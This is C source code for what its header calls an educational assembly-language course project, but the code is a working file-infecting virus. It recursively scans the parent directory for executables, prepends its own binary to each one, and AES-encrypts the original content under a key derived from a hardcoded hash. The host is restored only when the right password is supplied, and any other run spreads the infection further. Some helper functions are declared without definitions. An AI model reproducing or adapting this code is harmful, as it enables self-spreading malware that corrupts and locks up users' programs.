//***************************************************************************
//
// Program for education in subject "Assembly Languages"
// daniel.krupa@vsb.cz, , VSB-TUO
//
// Empty project
//
//***************************************************************************
#define _GNU_SOURCE
#define TARGET "../"
#define KEYSIZE 32
#define IVSIZE 16
#define CBC 1
#define CTR 1
#define ECB 1

#include <stdio.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <limits.h>
#include <stdlib.h>
#include <openssl/sha.h>
#include "aes.h"  //used code from https://github.com/kokke/tiny-AES-c
// Variables
//
;
char SELF[PATH_MAX];
enum {
	WALK_OK = 0,
	WALK_NAMETOOLONG,
	WALK_BADIO,
};
char  corpas[SHA512_DIGEST_LENGTH]  = 
			   {0xE6,0x1B,0x6A,0x99,0x5F,0x8E,0x45,0xAA,
				0xF6,0x30,0x6E,0xE6,0xF6,0x7E,0x52,0x52,
				0x67,0x38,0x91,0x8A,0x33,0xEF,0x81,0x95,
				0xC2,0xCC,0x93,0x2F,0xA6,0xD4,0x63,0x82,
				0xDB,0x31,0x8B,0xD0,0x9A,0x3D,0xEA,0x57,
				0x85,0xD5,0xB8,0x9E,0xC8,0x3E,0xB8,0xC4,
				0x2A,0x8E,0x10,0x74,0xD1,0x3C,0x5B,0xFE,
				0x74,0xC1,0x30,0x26,0x7E,0x09,0xC3,0x4E};;
char key[KEYSIZE];
char inivect[IVSIZE];
int ComparePass(char* pass1,char * pass2,unsigned int len);
unsigned long long PadTo16(unsigned long long origlen);
void Zeroize(char* data,unsigned long long len);
void FillInfo(char*buffer,char padsize,unsigned long long ownsize);
char * ExtractFormerContent(char*infectedcontent,char*extractedcontent,unsigned long long from,unsigned long long len);
void GetInfectionInfo(char* infectedcontent,unsigned long long infectlen,unsigned long long *ownlen,char*padlen);
void CalculateDerivateArray(char*deriv,char*source,unsigned int sourcelen,unsigned int derivlen);
unsigned long long GetFileLen(char*filepath)
{
		FILE *file;
	
	unsigned long long contentlength;

	
	file = fopen(filepath, "rb");
	if (!file)
	{
		fprintf(stderr, "Unable to open file %s", filepath);
		return 0;
	}
	
	
	fseek(file, 0, SEEK_END);
	contentlength=ftell(file);
	fclose(file);
	return contentlength;
}



char* ReadFile(char* filepath,char*content,unsigned long long contentlength)
{

	FILE *file;
	
	
	file = fopen(filepath, "rb");
	if (!file)
	{
		fprintf(stderr, "Unable to open file %s", filepath);
		return NULL;
	}
	
	


	
	

	
	if (!content)
	{
		fprintf(stderr, "Memory error!");
		fclose(file);
		return NULL;
	}


	fread(content, contentlength, 1, file);
	fclose(file);

	return content;
}

void WriteFile(char* filepath,char*content,unsigned long long contentlength,char* mode)
{

	FILE *file;
	
	
	file = fopen(filepath, mode);
	if (!file)
	{
		fprintf(stderr, "Unable to open file %s", filepath);
		return ;
	}
	
	if (!content)
	{
		fprintf(stderr, "Memory error!");
		fclose(file);
		return ;
	}


	fwrite(content, contentlength, 1, file);
	fclose(file);

	return ;
}



void WriteHash(char *hash,int len)

{
	for(int i = 0;i< len;i++)
	{
		printf("%02X ",hash[i]& 0xff );
		
	}
	printf("\n");
	
	
}
void InfectFile(char* pathname)
{
	//Measuring files
	unsigned long long  ownlen = GetFileLen(SELF);
	unsigned long long  targetlen = GetFileLen(pathname);
	
	unsigned long long  padtargetlen = PadTo16(targetlen);
	char targetpadsize=padtargetlen-targetlen;
	
	//printf("Infecting %llu bytes with %llu bytes of code\n",targetlen,ownlen);
	
	if(targetlen == 0 || ownlen ==0)
	{
		printf("FIleLen 0\n");
		return;
		
	}
	
	//Reading Self
	char* mycontent = (char*)(malloc(ownlen));
	ReadFile(SELF,mycontent,ownlen);
	
	
	//Padding the memory for target file content
	
	//printf("PADDED\nInfecting %llu( + %u) bytes with %llu bytes of code\n",padtargetlen,targetpadsize,ownlen);
	
	//actually reading the target file

	char* targetcontent = (char*)(malloc(padtargetlen));
	Zeroize(targetcontent,padtargetlen);
	ReadFile(pathname,targetcontent,targetlen);
	//WriteHash(mycontent,ownlen);
	//printf("------------\n");
	//WriteHash(targetcontent,padtargetlen);
	
	
	//encrypting
	//strncpy(key,corpas,KEYSIZE);
	//strncpy(inivect,corpas+KEYSIZE,IVSIZE);
	CalculateDerivateArray(key,corpas,SHA512_DIGEST_LENGTH,KEYSIZE);
	CalculateDerivateArray(inivect,corpas,SHA512_DIGEST_LENGTH,IVSIZE);
	
	//printf("------------\n");
	//WriteHash(key,KEYSIZE);
	//WriteHash(inivect,IVSIZE);
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, inivect);
	AES_CBC_encrypt_buffer(&ctx,targetcontent,padtargetlen);
	
	WriteFile(pathname,mycontent,ownlen,"wb");
	WriteFile(pathname,targetcontent,padtargetlen,"ab");
	
	//creating appendix of information
	int addinfosize = 16;
	char info[addinfosize];
	Zeroize(info,addinfosize);
	FillInfo(info,targetpadsize,ownlen);
	//WriteHash(info,addinfosize);
	WriteFile(pathname,info,addinfosize,"ab");
	
	
	free(mycontent);
	free(targetcontent);
	
	
	
}

void FreeFile(char* password)
{
	int infosize = 16;
	unsigned long long  infectlen = GetFileLen(SELF);
	char* infectedcontent = (char*)(malloc(infectlen));
	Zeroize(infectedcontent,infectlen);
	ReadFile(SELF,infectedcontent,infectlen);
	unsigned long long ownlen=0;
	char padlen=0;
	GetInfectionInfo(infectedcontent,infectlen,&ownlen,&padlen);
	//WriteHash(&infectedcontent[infectlen-infosize],infosize);
	printf("Freeing %llu b file from %llu bytes of malicious code. %u bytes of padding will be removed\n",infectlen,ownlen,padlen);
	CalculateDerivateArray(key,corpas,SHA512_DIGEST_LENGTH,KEYSIZE);
	CalculateDerivateArray(inivect,corpas,SHA512_DIGEST_LENGTH,IVSIZE);
	
	
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, inivect);
	AES_CBC_decrypt_buffer(&ctx,&infectedcontent[ownlen],infectlen-ownlen-infosize);
	
	unsigned long long formerlen = infectlen-ownlen-infosize-padlen;
	char*formercontent = (char*)(malloc(formerlen));
	ExtractFormerContent(infectedcontent,formercontent,ownlen,formerlen);
	CalculateDerivateArray(key,corpas,SHA512_DIGEST_LENGTH,KEYSIZE);
	CalculateDerivateArray(inivect,corpas,SHA512_DIGEST_LENGTH,IVSIZE);
	
	//printf("------------\n");
	//WriteHash(key,KEYSIZE);
	//WriteHash(inivect,IVSIZE);
	
	
	
	printf("Freed result is at %llu, is %llu bytes long\n",ownlen,formerlen);
	
	if(!remove(SELF))
	{
		WriteFile(SELF,formercontent,formerlen,"wb");
		chmod(SELF,S_IRWXU|S_IRWXG|S_IRWXO);
		execl(SELF,SELF,password,(char*)NULL);
	}
	else
	{
		//printf("Deinfection Unsuccessful\n");
		
	}
	
	
	
	free(infectedcontent);
	free(formercontent);
}

int GetFiles(char* dirname)
{

    DIR *dir;
    struct dirent *entry;
	char fullname[PATH_MAX];
	int res = WALK_OK;
	int len = strlen(dirname);
	if (len >= PATH_MAX - 1)
		return WALK_NAMETOOLONG;
	strcpy(fullname, dirname);
	fullname[len++] = '/';

    if (!(dir = opendir(dirname)))
        return WALK_BADIO;

    while ((entry = readdir(dir)) != NULL) 
	{
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        strncpy(fullname + len, entry->d_name, PATH_MAX - len);
		
        if (entry->d_type == DT_DIR) 
		{
            
 
			//printf("%s/",path);
			GetFiles(fullname);
        }
		else 
		{
			
			 char fullpath[PATH_MAX];
			   realpath(fullname,fullpath);
			if(!access(fullname,X_OK) && strcmp(fullpath,SELF))
           {
			  
			printf("%s\n", fullpath);
			
			InfectFile(fullpath);
			//printf("%s\n",entry->d_name);
			}
        }
		
					

    }
    closedir(dir);
	return WALK_OK;
}	





void EncryptMode(char* targetdir)
{
	
	int errorcheck = GetFiles(targetdir);
	printf("END\n");
	
}

void DecryptMode(char* password)
{
	//printf("%s\n",password);
		
	char hash[SHA512_DIGEST_LENGTH];
	
	SHA512(password, strlen(password) , hash);
	//WriteHash(hash,SHA512_DIGEST_LENGTH);
	//WriteHash(corpas,SHA512_DIGEST_LENGTH);

	
	int res = ComparePass(hash,corpas,SHA512_DIGEST_LENGTH);
	if(res !=0)
	{
		//printf("Password incorrect %d\n",res);
		EncryptMode(TARGET);
	}
	else
	{
		//printf("Password Correct\n");
		FreeFile(password);
	}
}



int main(int argc, char **argv )
{
	
	
	
	realpath(argv[0],SELF);
	//printf("CODE: %s\n",SELF);
	if(argc <=1)
	{
		EncryptMode(TARGET);
		
	}
	else
	{
		char *password = argv[1];

			
	DecryptMode(password);
		
	}
					 
					 
					 
}



